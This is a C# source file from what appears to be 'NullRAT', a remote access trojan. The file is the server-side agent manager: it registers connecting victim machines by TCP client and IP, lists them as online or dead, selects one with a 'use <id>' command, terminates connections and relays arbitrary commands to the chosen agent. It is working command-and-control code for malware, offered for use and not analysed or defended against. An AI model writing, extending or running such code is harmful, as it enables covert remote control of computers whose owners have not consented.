using NullRAT.Server.UI;
using System;
using System.Collections.Generic;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;

namespace NullRAT.Server.Core
{
    public static class AgentManager
    {
        private static List<Agent> _agents = new List<Agent>();
        public static Agent CurrentAgent { get; set; } = null;

        public static void AddAgent(TcpClient client)
        {
            var agent = new Agent(client);
            _agents.Add(agent);

            ConsoleUI.Log($"[+] New agent connected! ID: {_agents.Count - 1} | {agent.IP}", ConsoleColor.Green);
        }

        public static void ListAgents()
        {
            if (_agents.Count == 0)
            {
                Console.WriteLine("No agents connected.");
                return;
            }

            Console.ForegroundColor = ConsoleColor.Magenta;
            Console.WriteLine("\nConnected Agents:");
            for (int i = 0; i < _agents.Count; i++)
            {
                string status = _agents[i].IsConnected ? "ONLINE" : "DEAD";
                Console.WriteLine($"[{i}] { _agents[i].IP } → {status}");
            }
            Console.ResetColor();
        }

        public static void SwitchAgent(int id)
        {
            if (id >= 0 && id < _agents.Count && _agents[id].IsConnected)
            {
                CurrentAgent = _agents[id];
                ConsoleUI.Log($"Switched to agent [{id}] {CurrentAgent.IP}", ConsoleColor.Cyan);
            }
            else
            {
                ConsoleUI.Log("Invalid agent ID or agent is dead.", ConsoleColor.Red);
            }
        }

        public static void KillAgent(int id)
        {
            if (id >= 0 && id < _agents.Count)
            {
                try
                {
                    _agents[id].Disconnect();
                    ConsoleUI.Log($"Agent [{id}] terminated.", ConsoleColor.Red);
                    if (CurrentAgent == _agents[id]) CurrentAgent = null;
                }
                catch { }
            }
        }

        public static async Task SendCommand(string command)
        {
            if (CurrentAgent == null)
            {
                ConsoleUI.Log("No agent selected. Use 'use <id>'", ConsoleColor.Red);
                return;
            }

            await CurrentAgent.SendCommand(command);
        }
    }
}